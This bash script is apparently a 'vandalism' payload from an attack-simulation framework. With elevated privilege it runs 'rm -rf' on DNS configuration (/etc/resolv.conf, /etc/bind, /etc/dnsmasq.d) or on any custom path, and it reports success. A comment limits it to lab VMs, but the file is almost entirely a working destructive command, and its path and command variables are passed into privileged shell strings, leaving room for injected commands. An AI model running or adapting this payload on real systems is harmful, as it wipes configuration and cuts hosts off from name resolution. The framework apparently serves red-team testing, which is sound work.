#!/usr/bin/env bash
#
# payloads/vandalism/dns_delete/commands.sh
#
# Simulates DNS/service vandalism by deleting common DNS-related configuration
# paths from the target VM.
#
# Intended only for local lab/VM environments under your control.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"

require_privilege

TARGET_MODE="${TARGET_MODE:-resolv_conf}"

RESOLV_CONF_PATH="${RESOLV_CONF_PATH:-/etc/resolv.conf}"

BIND_PATH="${BIND_PATH:-/etc/bind}"

DNSMASQ_PATH="${DNSMASQ_PATH:-/etc/dnsmasq.d}"

TARGET_PATH="${TARGET_PATH:-}"

REQUIRE_PATH_EXISTS="${REQUIRE_PATH_EXISTS:-true}"

CREATE_BACKUP_BEFORE_DELETE="${CREATE_BACKUP_BEFORE_DELETE:-false}"

BACKUP_DIR="${BACKUP_DIR:-/var/tmp/aegis_backups}"

DELETE_COMMAND="${DELETE_COMMAND:-rm -rf}"

case "$TARGET_MODE" in

    resolv_conf)

        RESOLVED_TARGET="$RESOLV_CONF_PATH"
        ;;

    bind)

        RESOLVED_TARGET="$BIND_PATH"
        ;;

    dnsmasq)

        RESOLVED_TARGET="$DNSMASQ_PATH"
        ;;

    custom)

        [[ -n "$TARGET_PATH" ]] || \
            fail "TARGET_PATH must be set when TARGET_MODE=custom"

        RESOLVED_TARGET="$TARGET_PATH"
        ;;

    *)

        fail "Unsupported TARGET_MODE: $TARGET_MODE"
        ;;

esac

record_metadata "target_mode=$TARGET_MODE"
record_metadata "target_path=$RESOLVED_TARGET"

if [[ "$REQUIRE_PATH_EXISTS" == "true" ]]; then

    if ! run_priv "test -e '$RESOLVED_TARGET'"; then
        fail "Target path does not exist: $RESOLVED_TARGET"
    fi

fi

if [[ "$CREATE_BACKUP_BEFORE_DELETE" == "true" ]]; then

    log "Creating backup before deletion"

    BACKUP_SUFFIX="$(random_lower_string 6)"

    BACKUP_NAME="dns_backup_${BACKUP_SUFFIX}.tar.gz"

    BACKUP_PATH="${BACKUP_DIR}/${BACKUP_NAME}"

    run_priv "mkdir -p '$BACKUP_DIR'"

    run_priv "tar -czf '$BACKUP_PATH' '$RESOLVED_TARGET'"

    record_metadata "backup_path=$BACKUP_PATH"

    log "Backup created: $BACKUP_PATH"

fi

log "Deleting DNS-related target"
log "Target mode: $TARGET_MODE"
log "Target path: $RESOLVED_TARGET"

run_priv "$DELETE_COMMAND '$RESOLVED_TARGET'"

if run_priv "test -e '$RESOLVED_TARGET'"; then
    fail "Deletion appears to have failed: $RESOLVED_TARGET still exists"
fi

record_metadata "deletion_success=true"

log "DNS vandalism payload complete"
log "Deleted: $RESOLVED_TARGET"
